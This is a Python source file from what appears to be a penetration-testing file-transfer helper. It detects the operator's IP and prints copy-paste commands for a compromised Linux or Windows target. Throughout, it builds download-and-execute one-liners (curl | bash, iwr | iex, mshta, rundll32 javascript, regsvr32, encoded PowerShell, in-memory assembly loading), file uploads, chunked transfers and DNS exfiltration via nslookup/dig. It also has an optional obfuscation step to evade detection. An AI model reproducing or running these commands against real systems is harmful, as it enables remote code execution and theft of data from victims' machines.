"""Local IP detection, interface picker, and target command generation."""

import base64
import hashlib
import os
import re
import subprocess
import sys
from urllib.parse import urlparse

# ---------------------------------------------------------------------------
# ANSI colors (only used when stderr is a tty)
# ---------------------------------------------------------------------------

def _c(code: str) -> str:
    return code if sys.stderr.isatty() else ""


BOLD = _c("\033[1m")
DIM = _c("\033[2m")
CYAN = _c("\033[36m")
GREEN = _c("\033[32m")
YELLOW = _c("\033[33m")
BLUE = _c("\033[34m")
RESET = _c("\033[0m")


# ---------------------------------------------------------------------------
# Network interfaces
# ---------------------------------------------------------------------------

def get_all_interfaces(ipv6: bool = False) -> list[tuple[str, str]]:
    """Return list of (interface_name, ip) excluding lo.

    When ipv6=True, also includes IPv6 addresses (excluding link-local fe80::).
    """
    flags = ["-4"] if not ipv6 else []
    try:
        out = subprocess.run(
            ["ip"] + flags + ["addr", "show"],
            capture_output=True,
            text=True,
            timeout=2,
        )
    except FileNotFoundError:
        return []
    if out.returncode != 0:
        return []
    current_iface = None
    result: list[tuple[str, str]] = []
    seen: set[tuple[str, str]] = set()
    for line in out.stdout.splitlines():
        if line and not line[0].isspace():
            parts = line.split(":", 2)
            current_iface = parts[1].strip() if len(parts) > 1 else None
        if current_iface and current_iface != "lo":
            m = re.search(r"inet6?\s+([0-9a-fA-F:.]+)", line)
            if m:
                addr = m.group(1)
                if addr.startswith("fe80"):
                    continue
                key = (current_iface, addr)
                if key not in seen:
                    seen.add(key)
                    result.append(key)
    return result


def _pick_interface_fzf(choices: list[tuple[str, str]]) -> str | None:
    """Use fzf to pick one; return selected ip or None."""
    lines = [f"{name}  {ip}" for name, ip in choices]
    try:
        p = subprocess.run(
            ["fzf", "--height", "10", "-1", "--prompt", "interface: "],
            input="\n".join(lines),
            stdout=subprocess.PIPE,
            stderr=None,
            text=True,
            timeout=30,
        )
        if p.returncode != 0 or not p.stdout.strip():
            return None
        selected = p.stdout.strip()
        for name, ip in choices:
            if f"{name}  {ip}" == selected or ip == selected:
                return ip
        if re.match(r"^\d+\.\d+\.\d+\.\d+$", selected):
            return selected
        parts = selected.split()
        return parts[-1] if parts and re.match(r"^\d+\.\d+\.\d+\.\d+$", parts[-1]) else None
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return None


def _pick_interface_menu(choices: list[tuple[str, str]]) -> str | None:
    """Numbered menu on stderr; return selected ip or None."""
    for i, (name, ip) in enumerate(choices, 1):
        sys.stderr.write(f"  {i}) {name}  {ip}\n")
    sys.stderr.write("  choice (1-{}): ".format(len(choices)))
    sys.stderr.flush()
    try:
        line = input().strip()
        idx = int(line)
        if 1 <= idx <= len(choices):
            return choices[idx - 1][1]
    except (ValueError, EOFError):
        pass
    return None


def pick_platform() -> str | None:
    """Fuzzy pick Windows or GNU/Linux; return 'windows' or 'linux', or None to show both."""
    if not sys.stderr.isatty():
        return None
    choices = [("Windows", "windows"), ("GNU/Linux", "linux")]
    lines = [label for label, _ in choices]
    try:
        p = subprocess.run(
            ["fzf", "--height", "5", "-1", "--prompt", "platform: "],
            input="\n".join(lines),
            stdout=subprocess.PIPE,
            stderr=None,
            text=True,
            timeout=30,
        )
        if p.returncode != 0 or not p.stdout.strip():
            return None
        selected = p.stdout.strip().lower()
        if selected == "windows":
            return "windows"
        if selected in ("linux", "gnu/linux"):
            return "linux"
        return None
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass
    sys.stderr.write("\n  platform: 1) Windows  2) GNU/Linux  [1/2]: ")
    sys.stderr.flush()
    try:
        line = input().strip() or "1"
        if line == "2":
            return "linux"
        return "windows"
    except EOFError:
        return None


def pick_interface() -> str | None:
    """Show fuzzy finder or menu to select interface; return its IPv4 or None."""
    choices = get_all_interfaces()
    if not choices:
        return None
    if len(choices) == 1:
        return choices[0][1]
    if not sys.stderr.isatty():
        return get_local_ip()
    return _pick_interface_fzf(choices) or _pick_interface_menu(choices)


def get_local_ip() -> str | None:
    """Return preferred local IPv4 (tun0 first, then first non-lo), or None."""
    ifaces = get_all_interfaces()
    for name, ip in ifaces:
        if name == "tun0":
            return ip
    return ifaces[0][1] if ifaces else None


# ---------------------------------------------------------------------------
# URL helpers
# ---------------------------------------------------------------------------

def _port_proto(port: int, protocol: str) -> tuple[str, str]:
    port_opt = "" if port == 80 else f" -p {port}"
    proto_opt = "" if protocol == "http" else f" --protocol {protocol}"
    return port_opt, proto_opt


def _base_url(ip: str, port: int) -> str:
    scheme = "https" if port == 443 else "http"
    host = f"[{ip}]" if ":" in ip else ip  # bracket IPv6
    if port in (80, 443):
        return f"{scheme}://{host}"
    return f"{scheme}://{host}:{port}"


def get_serve_base(port: int, protocol: str = "http") -> tuple[str | None, str | None]:
    """Run platform and interface pickers; return (base_url, platform) or (None, None)."""
    platform = pick_platform()
    my_ip = pick_interface()
    if not my_ip:
        my_ip = get_local_ip()
    if not my_ip or protocol != "http":
        return (None, None)
    return (_base_url(my_ip, port), platform)


# ---------------------------------------------------------------------------
# Auth helpers for target commands
# ---------------------------------------------------------------------------

def _curl_auth(auth: str | None) -> str:
    """Return curl -u flag snippet or empty string."""
    return f" -u {auth}" if auth else ""


def _wget_auth(auth: str | None) -> str:
    """Return wget --user/--password flags or empty string."""
    if not auth:
        return ""
    user, _, password = auth.partition(":")
    return f" --user={user} --password={password}"


def _ps_auth_headers(auth: str | None) -> str:
    """Return PowerShell header snippet for basic auth."""
    if not auth:
        return ""
    return f' -Headers @{{Authorization="Basic " + [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("{auth}"))}}'


# ---------------------------------------------------------------------------
# Proxy helpers for target commands
# ---------------------------------------------------------------------------

def _curl_proxy(proxy: str | None) -> str:
    return f" --proxy {proxy}" if proxy else ""


def _wget_proxy(proxy: str | None) -> str:
    return f" -e use_proxy=yes -e http_proxy={proxy}" if proxy else ""


def _ps_proxy(proxy: str | None) -> str:
    return f' -Proxy "{proxy}"' if proxy else ""


# ---------------------------------------------------------------------------
# Target commands — receive (download)
# ---------------------------------------------------------------------------

def _target_receive_linux(
    base: str, path: str = "/path/to/file", out: str = "/tmp/payload.bin",
    auth: str | None = None, proxy: str | None = None,
) -> str:
    p = urlparse(base)
    host = p.hostname or "YOUR_IP"
    port = p.port or (443 if p.scheme == "https" else 80)
    url = f"{base}{path}"
    ca = _curl_auth(auth)
    cp = _curl_proxy(proxy)
    wa = _wget_auth(auth)
    wp = _wget_proxy(proxy)
    dev_tcp = f"exec 3<>/dev/tcp/{host}/{port}; echo -e \"GET {path} HTTP/1.0\\n\\n\" >&3; cat <&3 > {out}"
    lines = [
        f"curl{ca}{cp} -o {out} {url}",
        f"wget{wa}{wp} -O {out} {url}",
        dev_tcp,
    ]
    return "\n".join(lines)


def _target_receive_linux_lolbins(
    base: str, path: str = "/path/to/file", out: str = "/tmp/payload.bin",
) -> list[str]:
    """GTFOBins: python, perl, ruby, php, nc, socat, openssl, lwp-download, tftp."""
    url = f"{base}{path}"
    p = urlparse(base)
    host = p.hostname or "YOUR_IP"
    port = p.port or (443 if p.scheme == "https" else 80)
    return [
        f"python3 -c \"import urllib.request; urllib.request.urlretrieve('{url}', '{out}')\"",
        f"python -c \"import urllib; urllib.urlretrieve('{url}', '{out}')\"",
        f"perl -e 'use LWP::Simple; getstore(\"{url}\", \"{out}\")'",
        f"ruby -e 'require \"open-uri\"; File.write(\"{out}\", URI.open(\"{url}\").read)'",
        f"php -r 'file_put_contents(\"{out}\", file_get_contents(\"{url}\"));'",
        f"lwp-download {url} {out}",
        f"openssl s_client -connect {host}:{port} -quiet < /dev/null > {out}" if port == 443 else f"nc {host} {port} > {out}",
        f"socat - TCP:{host}:{port} > {out}",
        f"tftp {host} -c get {path.lstrip('/')} {out}",
    ]


def _target_receive_win(
    base: str, path: str = "/path/to/file", out: str = "out",
    auth: str | None = None, proxy: str | None = None,
) -> str:
    url = f"{base}{path}"
    ca = _curl_auth(auth)
    cp = _curl_proxy(proxy)
    pa = _ps_auth_headers(auth)
    pp = _ps_proxy(proxy)
    return (
        f"curl{ca}{cp} -o {out} {url}\n"
        f"wget{_wget_auth(auth)}{_wget_proxy(proxy)} -O {out} {url}\n"
        f"certutil -urlcache -split -f {url} {out}\n"
        f'iwr -Uri "{url}"{pa}{pp} -OutFile "{out}"\n'
        f'bitsadmin /transfer job /download /priority high "{url}" "{out}"'
    )


def _target_receive_win_lolbas(
    base: str, path: str = "/path/to/file", out: str = "out",
) -> list[str]:
    """LOLBAS: DownloadFile, Start-BitsTransfer, mshta, regsvr32, msiexec, hh, esentutl, expand, replace, findstr, cscript."""
    url = f"{base}{path}"
    p = urlparse(base)
    host = p.hostname or "YOUR_IP"
    port = p.port or (443 if p.scheme == "https" else 80)
    return [
        f'(New-Object Net.WebClient).DownloadFile("{url}", "{out}")',
        f'Start-BitsTransfer -Source "{url}" -Destination "{out}"',
        f'mshta "{url}"',
        f'regsvr32 /s /n /u /i:{url} scrobj.dll',
        f'msiexec /q /i {url}',
        f'hh.exe {url}',
        f'esentutl.exe /y "\\\\{host}@{port}\\DavWWWRoot{path}" /d "{out}" /o',
        f'expand "\\\\{host}@{port}\\DavWWWRoot{path}" "{out}"',
        f'findstr /V /L "EXCHANGER_NEEDLE" "\\\\{host}@{port}\\DavWWWRoot{path}" > "{out}"',
        f'replace "\\\\{host}@{port}\\DavWWWRoot{path}" . /A',
        f'cscript //nologo /e:jscript \\\\{host}@{port}\\DavWWWRoot{path}',
    ]


# ---------------------------------------------------------------------------
# Target commands — send (upload)
# ---------------------------------------------------------------------------

def _target_send_linux(
    base: str, path: str = "./file", name: str = "file",
    auth: str | None = None, proxy: str | None = None,
) -> str:
    return f"curl{_curl_auth(auth)}{_curl_proxy(proxy)} -X POST --data-binary @{path} {base}/{name}"


def _target_send_linux_lolbins(
    base: str, path: str = "./file", name: str = "file",
) -> list[str]:
    """GTFOBins upload: nc, python, openssl, bash /dev/tcp."""
    p = urlparse(base)
    host = p.hostname or "YOUR_IP"
    port = p.port or 80
    return [
        f"nc {host} {port} < {path}",
        f"python3 -c \"import requests; requests.post('{base}/{name}', data=open('{path}','rb').read())\"",
        f"openssl s_client -connect {host}:{port} < {path}" if port == 443 else f"bash -c 'cat {path} > /dev/tcp/{host}/{port}'",
        f"socat - TCP:{host}:{port} < {path}",
    ]


def _target_send_win(
    base: str, path: str = "file", name: str = "file",
    auth: str | None = None, proxy: str | None = None,
) -> str:
    return f"curl{_curl_auth(auth)}{_curl_proxy(proxy)} -X POST --data-binary @{path} {base}/{name}"


def _target_send_win_lolbas(
    base: str, path: str = "file", name: str = "file",
) -> list[str]:
    """LOLBAS upload: WebClient.UploadFile, WebClient.UploadData, Invoke-WebRequest POST."""
    return [
        f'(New-Object Net.WebClient).UploadFile("{base}/{name}", "{path}")',
        f'(New-Object Net.WebClient).UploadData("{base}/{name}", [IO.File]::ReadAllBytes("{path}"))',
        f'iwr -Uri "{base}/{name}" -Method POST -InFile "{path}"',
    ]


# ---------------------------------------------------------------------------
# Target commands — in-memory execution
# ---------------------------------------------------------------------------

def _target_inmemory_linux(
    base: str, path: str = "/path/to/file",
    auth: str | None = None, proxy: str | None = None,
) -> list[str]:
    url = base.rstrip("/") + path
    ca = _curl_auth(auth)
    cp = _curl_proxy(proxy)
    wa = _wget_auth(auth)
    wp = _wget_proxy(proxy)
    return [
        f"curl{ca}{cp} -s {url} | bash",
        f"wget{wa}{wp} -qO- {url} | bash",
    ]


def _target_inmemory_linux_lolbins(
    base: str, path: str = "/path/to/file",
) -> list[str]:
    """GTFOBins in-memory: python exec, perl eval, ruby eval, php eval."""
    url = base.rstrip("/") + path
    return [
        f"python3 -c \"import urllib.request; exec(urllib.request.urlopen('{url}').read())\"",
        f"python -c \"import urllib; exec(urllib.urlopen('{url}').read())\"",
        f"perl -e 'use LWP::Simple; eval(get(\"{url}\"))'",
        f"ruby -e 'require \"open-uri\"; eval(URI.open(\"{url}\").read)'",
        f"php -r 'eval(file_get_contents(\"{url}\"));'",
    ]


def _target_inmemory_win(
    base: str, path: str = "/path/to/file",
    auth: str | None = None, proxy: str | None = None,
) -> list[str]:
    url = base.rstrip("/") + path
    pa = _ps_auth_headers(auth)
    pp = _ps_proxy(proxy)
    return [
        f'iwr -Uri "{url}" -UseBasicParsing{pa}{pp} | iex',
        f'(New-Object Net.WebClient).DownloadString("{url}") | iex',
    ]


def _target_inmemory_win_lolbas(
    base: str, path: str = "/path/to/file",
) -> list[str]:
    """LOLBAS in-memory: mshta vbscript, rundll32 javascript, PS -enc, cscript, Reflection.Assembly."""
    url = base.rstrip("/") + path
    # Build -enc payload for IEX(IWR ...)
    inner_cmd = f"iex (iwr '{url}' -UseBasicParsing).Content"
    enc = base64.b64encode(inner_cmd.encode("utf-16-le")).decode("ascii")
    return [
        f'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass -c iex(iwr \'{url}\' -useb)"", 0:close")',
        f'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","{url}",false);h.Send();eval(h.ResponseText)',
        f"powershell -enc {enc}",
        f'cscript //nologo /e:jscript <(echo var x=new ActiveXObject("MSXML2.XMLHTTP");x.open("GET","{url}",false);x.send();eval(x.responseText);)',
        f'[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData("{url}"))',
    ]


# ---------------------------------------------------------------------------
# Target commands — checksum verification
# ---------------------------------------------------------------------------

def _checksum_commands_linux(out: str, sha256: str | None = None) -> list[str]:
    if sha256:
        return [f'echo "{sha256}  {out}" | sha256sum -c -']
    return [f"sha256sum {out}"]


def _checksum_commands_win(out: str, sha256: str | None = None) -> list[str]:
    if sha256:
        return [f'if ((Get-FileHash "{out}" -Algorithm SHA256).Hash -eq "{sha256.upper()}") {{ Write-Host "OK" }} else {{ Write-Host "MISMATCH" }}']
    return [f'Get-FileHash "{out}" -Algorithm SHA256']


def _compute_sha256(filepath: str) -> str | None:
    """Compute SHA256 of a local file. Return hex digest or None."""
    try:
        h = hashlib.sha256()
        with open(filepath, "rb") as f:
            for chunk in iter(lambda: f.read(65536), b""):
                h.update(chunk)
        return h.hexdigest()
    except OSError:
        return None


# ---------------------------------------------------------------------------
# Target commands — DNS exfil stagers
# ---------------------------------------------------------------------------

def _dns_exfil_linux(domain: str, filepath: str = "./file") -> list[str]:
    return [
        f"xxd -p {filepath} | fold -w 60 | while read h; do nslookup $h.{domain}; done",
        f"cat {filepath} | base64 -w0 | fold -w 60 | while read b; do dig $b.{domain}; done",
    ]


def _dns_exfil_win(domain: str, filepath: str = "file") -> list[str]:
    return [
        f'$d=[Convert]::ToBase64String([IO.File]::ReadAllBytes("{filepath}")); for($i=0;$i -lt $d.Length;$i+=60){{ nslookup $d.Substring($i,[Math]::Min(60,$d.Length-$i)).{domain} }}',
    ]


# ---------------------------------------------------------------------------
# Target commands — chunked transfer
# ---------------------------------------------------------------------------

def _chunked_send_linux(
    base: str, filepath: str = "./file", chunk_size: int = 65536,
    auth: str | None = None, proxy: str | None = None,
) -> list[str]:
    ca = _curl_auth(auth)
    cp = _curl_proxy(proxy)
    return [
        f"split -b {chunk_size} {filepath} /tmp/chunk_ && for f in /tmp/chunk_*; do curl{ca}{cp} -X POST --data-binary @$f {base}/$(basename $f); done",
    ]


def _chunked_send_win(
    base: str, filepath: str = "file", chunk_size: int = 65536,
    auth: str | None = None, proxy: str | None = None,
) -> list[str]:
    ca = _curl_auth(auth)
    cp = _curl_proxy(proxy)
    return [
        f'$bytes=[IO.File]::ReadAllBytes("{filepath}"); for($i=0;$i -lt $bytes.Length;$i+={chunk_size}){{ $chunk=$bytes[$i..([Math]::Min($i+{chunk_size}-1,$bytes.Length-1))]; curl{ca}{cp} -X POST --data-binary @- {base}/chunk_$i --% < $chunk }}',
    ]


# ---------------------------------------------------------------------------
# Target commands — WebDAV (Windows net use)
# ---------------------------------------------------------------------------

def _webdav_commands_win(base: str, path: str = "/path/to/file", out: str = "out") -> list[str]:
    p = urlparse(base)
    host = p.hostname or "YOUR_IP"
    port = p.port or (443 if p.scheme == "https" else 80)
    webdav_path = f"\\\\{host}@{port}\\DavWWWRoot"
    return [
        f"net use Z: {webdav_path} && copy Z:{path.replace('/', chr(92))} {out}",
        f"copy {webdav_path}{path.replace('/', chr(92))} {out}",
    ]


# ---------------------------------------------------------------------------
# Clipboard
# ---------------------------------------------------------------------------

def copy_to_clipboard(text: str) -> bool:
    """Try to copy text to clipboard. Return True on success."""
    for cmd in (["xclip", "-selection", "clipboard"], ["xsel", "--clipboard", "--input"], ["pbcopy"]):
        try:
            subprocess.run(cmd, input=text.encode(), check=True, timeout=2)
            return True
        except (FileNotFoundError, subprocess.CalledProcessError, subprocess.TimeoutExpired):
            continue
    return False


# ---------------------------------------------------------------------------
# File picker
# ---------------------------------------------------------------------------

_MAX_WALK_DEPTH = 8
_MAX_FILES_TO_LIST = 10_000


def pick_file_to_serve(dir_abs: str) -> str | None:
    """Fuzzy-pick a file under dir_abs; return relative path or None."""
    files: list[str] = []
    base_depth = dir_abs.rstrip(os.sep).count(os.sep)
    for root, dirs, names in os.walk(dir_abs):
        depth = root.count(os.sep) - base_depth
        if depth >= _MAX_WALK_DEPTH:
            dirs.clear()
            continue
        rel_root = os.path.relpath(root, dir_abs)
        if rel_root == ".":
            rel_root = ""
        for name in names:
            path = os.path.join(rel_root, name) if rel_root else name
            files.append(path)
            if len(files) >= _MAX_FILES_TO_LIST:
                break
        if len(files) >= _MAX_FILES_TO_LIST:
            break
    if not files:
        return None
    try:
        p = subprocess.run(
            ["fzf", "--height", "15", "-1", "--prompt", "file to serve: "],
            input="\n".join(sorted(files)),
            stdout=subprocess.PIPE,
            stderr=None,
            text=True,
            timeout=60,
            cwd=dir_abs,
        )
        if p.returncode != 0 or not p.stdout.strip():
            return None
        return p.stdout.strip()
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return None


# ---------------------------------------------------------------------------
# Output helpers
# ---------------------------------------------------------------------------

# Collects first command line for clipboard
_first_command: str | None = None


def _write_section(
    title: str, emoji: str, lines: list[str],
    obfuscate: bool = False, clipboard: bool = False,
) -> None:
    global _first_command
    sys.stderr.write(f"\n  {YELLOW}{BOLD}{emoji} {title}{RESET}\n")
    for line in lines:
        if obfuscate:
            from .obfuscate_ import obfuscate_bash, obfuscate_powershell
            _PS_MARKERS = (
                "iwr", "iex", "certutil", "bitsadmin", "OutFile",
                "WebClient", "Invoke-", "Net.WebClient", "Start-BitsTransfer",
                "mshta", "regsvr32", "msiexec", "cscript", "rundll32",
                "powershell", "Get-FileHash", "DownloadString", "DownloadFile",
                "UploadFile", "UploadData", "Reflection.Assembly",
                "hh.exe", "esentutl", "-enc",
            )
            if any(x in line for x in _PS_MARKERS):
                line = obfuscate_powershell(line)
            else:
                line = obfuscate_bash(line)
            sys.stdout.write(line + "\n")
        else:
            sys.stderr.write(f"  {CYAN}{line}{RESET}\n")
        if clipboard and _first_command is None:
            _first_command = line


# ---------------------------------------------------------------------------
# Print commands — serve mode
# ---------------------------------------------------------------------------

def print_commands_serve(
    port: int,
    protocol: str = "http",
    serve_path: str | None = None,
    _base: str | None = None,
    _platform: str | None = None,
    obfuscate: bool = False,
    auth: str | None = None,
    proxy: str | None = None,
    clipboard: bool = False,
) -> tuple[str | None, str | None]:
    """Print copy-paste commands for target."""
    global _first_command
    _first_command = None

    if _base is None or _platform is None:
        return (None, None)
    base = _base
    platform = _platform
    url_path = ("/" + serve_path) if serve_path else "/path/to/file"
    path_display = serve_path if serve_path else "path/to/file"
    name_display = path_display.split("/")[-1] if path_display else "file"
    out_linux = f"/tmp/{name_display}"
    out_win = name_display
    send_path = "path/to/file"
    send_name = "path/to/file"

    # Compute checksum for the file if it exists
    sha256 = None
    if serve_path:
        sha256 = _compute_sha256(serve_path)

    sys.stderr.write(f"\n  {BOLD}📋 Run on target (copy-paste):{RESET}\n")
    if serve_path:
        sys.stderr.write(f"  {DIM}📁 {path_display} — server exits after download{RESET}\n")
    if auth:
        sys.stderr.write(f"  {DIM}🔒 auth: {auth}{RESET}\n")

    if platform in (None, "linux"):
        recv_lines = _target_receive_linux(base, path=url_path, out=out_linux, auth=auth, proxy=proxy).strip().split("\n")
        send_lines = [_target_send_linux(base, path=f"./{send_path}", name=send_name, auth=auth, proxy=proxy)]
        _write_section("GNU/Linux — receive (curl, wget, /dev/tcp)", "🐧 ⬇️", recv_lines, obfuscate, clipboard)
        _write_section("GNU/Linux — receive LOLBins (python, perl, ruby, php, nc, socat, openssl, tftp)", "🐧 🔧",
                       _target_receive_linux_lolbins(base, path=url_path, out=out_linux), obfuscate, clipboard)
        if sha256:
            _write_section("GNU/Linux — verify checksum", "🐧 🔍", _checksum_commands_linux(out_linux, sha256), obfuscate, clipboard)
        _write_section("GNU/Linux — in-memory (curl | bash, wget | bash)", "🐧 💾",
                       _target_inmemory_linux(base, path=url_path, auth=auth, proxy=proxy), obfuscate, clipboard)
        _write_section("GNU/Linux — in-memory LOLBins (python, perl, ruby, php)", "🐧 ⚡",
                       _target_inmemory_linux_lolbins(base, path=url_path), obfuscate, clipboard)
        _write_section("GNU/Linux — send (curl POST)", "🐧 ⬆️", send_lines, obfuscate, clipboard)
        _write_section("GNU/Linux — send LOLBins (nc, python, openssl, socat)", "🐧 📤",
                       _target_send_linux_lolbins(base, path=f"./{send_path}", name=send_name), obfuscate, clipboard)
        _write_section("GNU/Linux — chunked send", "🐧 📦", _chunked_send_linux(base, auth=auth, proxy=proxy), obfuscate, clipboard)
        _write_section("GNU/Linux — DNS exfil", "🐧 🌐",
                       _dns_exfil_linux("YOUR_DOMAIN", filepath=f"./{send_path}"), obfuscate, clipboard)

    if platform in (None, "windows"):
        recv_lines = _target_receive_win(base, path=url_path, out=out_win, auth=auth, proxy=proxy).strip().split("\n")
        send_lines = [_target_send_win(base, path=send_path, name=send_name, auth=auth, proxy=proxy)]
        _write_section("Windows — receive (curl, wget, certutil, iwr, bitsadmin)", "🪟 ⬇️", recv_lines, obfuscate, clipboard)
        _write_section("Windows — receive LOLBAS (DownloadFile, BitsTransfer, mshta, regsvr32, msiexec, hh, esentutl)", "🪟 🔧",
                       _target_receive_win_lolbas(base, path=url_path, out=out_win), obfuscate, clipboard)
        if sha256:
            _write_section("Windows — verify checksum", "🪟 🔍", _checksum_commands_win(out_win, sha256), obfuscate, clipboard)
        _write_section("Windows — in-memory (iwr | iex, WebClient)", "🪟 💾",
                       _target_inmemory_win(base, path=url_path, auth=auth, proxy=proxy), obfuscate, clipboard)
        _write_section("Windows — in-memory LOLBAS (mshta, rundll32, -enc, cscript, Reflection)", "🪟 ⚡",
                       _target_inmemory_win_lolbas(base, path=url_path), obfuscate, clipboard)
        _write_section("Windows — send (curl POST)", "🪟 ⬆️", send_lines, obfuscate, clipboard)
        _write_section("Windows — send LOLBAS (UploadFile, UploadData, iwr POST)", "🪟 📤",
                       _target_send_win_lolbas(base, path=send_path, name=send_name), obfuscate, clipboard)
        _write_section("Windows — WebDAV (net use)", "🪟 📂", _webdav_commands_win(base, path=url_path, out=out_win), obfuscate, clipboard)
        _write_section("Windows — chunked send", "🪟 📦", _chunked_send_win(base, auth=auth, proxy=proxy), obfuscate, clipboard)
        _write_section("Windows — DNS exfil", "🪟 🌐",
                       _dns_exfil_win("YOUR_DOMAIN", filepath=send_path), obfuscate, clipboard)

    sys.stderr.write("\n")
    sys.stderr.flush()
    if obfuscate:
        sys.stdout.flush()

    if clipboard and _first_command:
        if copy_to_clipboard(_first_command):
            sys.stderr.write(f"  {GREEN}📋 First command copied to clipboard{RESET}\n")
        else:
            sys.stderr.write(f"  {YELLOW}📋 Clipboard not available (install xclip, xsel, or pbcopy){RESET}\n")

    return (base, platform)


# ---------------------------------------------------------------------------
# Print commands — receive mode
# ---------------------------------------------------------------------------

def print_commands_receive_listen(
    port: int, protocol: str = "http", obfuscate: bool = False,
    auth: str | None = None, proxy: str | None = None,
    clipboard: bool = False,
) -> None:
    """Print copy-paste for target to POST file to you (host is listening)."""
    global _first_command
    _first_command = None

    platform = pick_platform()
    my_ip = pick_interface()
    if not my_ip or protocol != "http":
        return
    base = _base_url(my_ip, port)
    sys.stderr.write(f"\n  {BOLD}📋 Run on target (POST file to you):{RESET}\n")
    if auth:
        sys.stderr.write(f"  {DIM}🔒 auth: {auth}{RESET}\n")

    if platform in (None, "linux"):
        _write_section("GNU/Linux — send (curl POST)", "🐧 ⬆️", [_target_send_linux(base, auth=auth, proxy=proxy)], obfuscate, clipboard)
        _write_section("GNU/Linux — send LOLBins (nc, python, openssl, socat)", "🐧 📤",
                       _target_send_linux_lolbins(base), obfuscate, clipboard)
        _write_section("GNU/Linux — chunked send", "🐧 📦", _chunked_send_linux(base, auth=auth, proxy=proxy), obfuscate, clipboard)
        _write_section("GNU/Linux — DNS exfil", "🐧 🌐", _dns_exfil_linux("YOUR_DOMAIN"), obfuscate, clipboard)
    if platform in (None, "windows"):
        _write_section("Windows — send (curl POST)", "🪟 ⬆️", [_target_send_win(base, auth=auth, proxy=proxy)], obfuscate, clipboard)
        _write_section("Windows — send LOLBAS (UploadFile, UploadData, iwr POST)", "🪟 📤",
                       _target_send_win_lolbas(base), obfuscate, clipboard)
        _write_section("Windows — chunked send", "🪟 📦", _chunked_send_win(base, auth=auth, proxy=proxy), obfuscate, clipboard)
        _write_section("Windows — DNS exfil", "🪟 🌐", _dns_exfil_win("YOUR_DOMAIN"), obfuscate, clipboard)
    sys.stderr.write("\n")
    if obfuscate:
        sys.stdout.flush()

    if clipboard and _first_command:
        if copy_to_clipboard(_first_command):
            sys.stderr.write(f"  {GREEN}📋 First command copied to clipboard{RESET}\n")
        else:
            sys.stderr.write(f"  {YELLOW}📋 Clipboard not available (install xclip, xsel, or pbcopy){RESET}\n")
